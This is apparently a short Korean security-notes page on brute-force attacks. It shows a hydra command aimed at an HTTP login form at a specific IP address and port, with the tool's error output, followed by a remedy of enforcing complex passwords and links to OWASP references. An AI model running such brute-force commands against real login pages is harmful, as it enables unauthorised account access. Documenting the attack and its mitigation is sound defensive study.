## 무차별 대입 공격
![image](https://github.com/user-attachments/assets/3a9ed717-49d2-4271-bd40-f59f06f166fb)

![image](https://github.com/user-attachments/assets/26c23b16-ace3-4b29-bca4-0d9d5f4876db)

```
hydra 190.13.132.90 -s 8081 -V -L /home/nicolas/Escritorio/USER -P /home/nicolas/Escritorio/passwords.txt http-post-form "/user=^USER^&password=^PASS^=Ingresar&culture=es-CL&mobile=0&clasica=1:F=Usuario inexistente:H=Cookie: stwa2={"lang":"es-CL"}"
Hydra v8.7-dev (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-29 14:34:51
[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: F=Usuario inexistente
```
해결방안 : 복잡한 암호(대/소문자, 특수 문자 포함 10자 이상 등)를 강제하는 로직을 구현     
## More Information.
[# BruteForce
BruteForce
](https://owasp.org/www-community/attacks/Brute_force_attack
http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password
http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html
)
